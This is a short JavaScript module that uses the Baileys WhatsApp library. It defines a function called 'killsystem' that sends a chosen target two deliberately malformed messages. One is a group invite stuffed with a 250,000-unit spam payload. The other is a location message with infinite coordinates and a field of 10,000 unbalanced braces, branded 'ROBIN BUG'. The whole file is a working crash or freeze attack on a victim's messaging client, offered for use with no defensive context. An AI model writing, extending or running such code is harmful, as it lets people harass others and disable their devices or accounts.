
const { delay } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');
const { sendRawBug } = require('./RawSender');

async function killsystem(SYxS7, target) {
    try {
        const superSpam = getSuperPayload(250000);
        
        const payload1 = {
            groupInviteMessage: {
                groupName: superSpam,
                groupJid: "561611-1627579259@g.us",
                inviteCode: "h+64P9RhJDzgXSPf",
                inviteExpiration: 32503680000,
                caption: superSpam
            }
        };

        const payload2 = {
            locationMessage: {
                degreesLatitude: Infinity,
                degreesLongitude: -Infinity,
                name: "‼️⃟ ༚ ROBIN BUG.   " + superSpam,
                inviteLinkGroupTypeV2: "DEFAULT",
                contextInfo: {
                    remoteJid: "@s.whatsapp.net",
                    mentionedJid: [target],
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000)
                    }
                }
            }
        };

        // Sending raw nodes
        await sendRawBug(SYxS7, target, payload1);
        await delay(500);
        await sendRawBug(SYxS7, target, payload2);
        
    } catch (err) {
        console.error("[killsystem] Raw Error:", err.message);
    }
}

module.exports = { killsystem };
